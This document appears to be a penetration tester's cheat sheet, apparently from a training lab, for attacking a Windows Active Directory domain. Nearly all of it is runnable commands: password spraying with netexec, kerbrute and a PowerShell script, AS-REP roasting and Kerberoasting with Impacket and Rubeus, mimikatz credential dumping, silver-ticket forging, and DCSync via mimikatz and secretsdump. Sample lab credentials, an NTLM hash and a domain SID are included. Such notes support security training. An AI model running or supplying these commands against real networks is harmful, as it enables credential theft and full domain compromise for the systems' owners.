# Passwords Splay Attack

obtain the account policy
```
net accounts
```

## Powershell
using password spraying script
```
powershell -ep bypass
```
then execute [[Splay-Passwords.ps1]]
```
.\Splay-Password.ps1 -Pass Nexus123! -Admin
```
## netexec
SMB password spray 
```
nxc smb 192.168.x.x -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

against all domain joined machines
```
nxc smb ip.txt -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
## kerbrute
download
```
https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

execute
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

# AS-REP Roasting

## Impacket-GetNPUsers
Using GetNPUsers to perform AS-REP roasting
```
impacket-GetNPUsers -dc-ip 192.168.x.x -request -outputfile hashes.asreproast corp.com/pete
```
## Rubeus
obetain the AS-REP hash
```
.\Rubeus.exe asreproast /nowrap
```

Cracking the AS-REP hash with hashcat [[../Password Attack/Password Crack|Password Crack]]

# Kerberoasting

## Impacket-GetUserSPNs
Using impacket-GetUserSPNs to perform Kerberoasting on Linux
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.x.x corp.com/pete
```
## Rubeus
perform a kerberoast attack
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

cracking the TGS-REP hash with hashcat [[../Password Attack/Password Crack|Password Crack]]


# Silver Ticket
need to collect the folloing three pieces of information
```
1. SPN password hash (NTLM)
2. Domain SID
3. Target SPN
```

using mimikatz to obtain the NTLM hash of the target user acount
```
privilege::debug
sekurlsa::logonpasswords
```

obtaining the domain SID
```
whoami /user
```

forging the service ticket the impersonating user and inject it into the current session
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```


# Domain Controller Synchronization
members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups

## mimikatz
using mimikatz to obtain the credentials of user
```
lsadump::dcsync /user:corp\USERNAME
```

Administrator
```
lsadump::dcsync /user:corp\Administrator
```

## impacket-secretsdump
required ip of the DC in the format domain/user:password@ip

using secretsdump to perform the dcsync attack
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.x.x
```